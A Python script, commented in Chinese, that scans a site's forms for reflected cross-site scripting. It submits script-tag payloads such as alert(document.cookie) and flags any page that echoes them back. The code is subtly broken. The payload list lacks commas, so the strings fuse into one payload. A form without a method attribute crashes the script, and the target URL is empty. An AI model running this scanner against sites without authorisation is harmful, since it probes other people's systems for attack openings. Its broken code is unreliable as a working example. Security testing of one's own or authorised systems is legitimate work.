import requests
from bs4 import BeautifulSoup
#xss payloads列表
xss_payloads = [
    '<script>alert(1)</script>'
    '<script>alert(document.domain)</script>'
    '<script>alert(document.cookie)</script>'
    '<script>alert(document.location)</script>'
    '<script>alert(document.referrer)</script>'
    '<script>alert(document.title)</script>'
    '<script>alert(document.body)</script>'
    '<script>alert(document.head)</script>'
    '<script>alert(document.images)</script>'
    '<script>alert(document.links)</script>'

]


# 扫描函数
def scan_xss(url, payloads):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # 查找所有表单
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method')
            form_url = url + action if action else url

            inputs = form.find_all('input')
            for payload in payloads:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name:
                        data[name] = payload

                # 根据表单method发送请求
                if method.lower() == 'post':
                    result = requests.post(form_url, data=data)
                else:
                    result = requests.get(form_url, params=data)

                # 检查payload是否出现在响应中
                if payload in result.text:
                    print(f"可能的XSS漏洞在 {form_url} 中找到，payload: {payload}")

    except requests.RequestException as e:
        print(f"请求错误: {e}")


# 示例URL
url = ""
#扫描url
scan_xss(url, xss_payloads)

